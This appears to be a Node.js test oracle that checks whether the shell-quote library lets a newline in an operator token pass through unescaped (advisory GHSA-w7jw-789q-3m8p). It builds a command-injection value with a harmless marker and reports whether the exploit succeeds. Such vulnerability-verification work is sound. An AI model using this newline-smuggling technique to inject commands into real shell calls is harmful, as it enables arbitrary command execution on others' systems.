'use strict';

var operation_completed = false;
var exploit_succeeded = false;
var evidence = '';

try {
  var sq = require('shell-quote');
  if (!sq || typeof sq.quote !== 'function') {
    throw new Error('quote_api_unavailable');
  }

  // Benign call proves normal object-token operator quoting works.
  var benign = sq.quote(['echo', { op: '&&' }, 'ok']);
  if (typeof benign !== 'string') {
    throw new Error('benign_not_string');
  }
  if (benign !== 'echo \\&\\& ok') {
    throw new Error('benign_unexpected:' + JSON.stringify(benign));
  }

  operation_completed = true;

  // Malicious operator includes a literal newline, which vulnerable versions pass through.
  var marker = 'GHSA_W7JW_789Q_3M8P_MARK';
  var payloadOp = '&\n' + marker;

  try {
    var out = sq.quote(['safe', { op: payloadOp }, 'tail']);
    if (typeof out !== 'string') {
      exploit_succeeded = true;
      evidence = 'malicious_non_string_output';
    } else {
      var hasRawNewline = out.indexOf('\n') !== -1;
      var hasMarker = out.indexOf(marker) !== -1;
      var hasBackslashNLiteral = out.indexOf('\\n') !== -1;

      // Success signal: raw newline made it into shell text and marker is present.
      exploit_succeeded = hasRawNewline && hasMarker;
      evidence = 'out=' + JSON.stringify(out)
        + ';raw_newline=' + hasRawNewline
        + ';marker=' + hasMarker
        + ';backslash_n_literal=' + hasBackslashNLiteral;
    }
  } catch (err) {
    exploit_succeeded = false;
    evidence = 'malicious_rejected:' + (err && err.message ? err.message : String(err));
  }
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_benign_error:' + (e && e.message ? e.message : String(e));
}

console.log('ORACLE_RESULT ' + JSON.stringify({
  operation_completed: operation_completed,
  exploit_succeeded: exploit_succeeded,
  evidence: evidence
}));
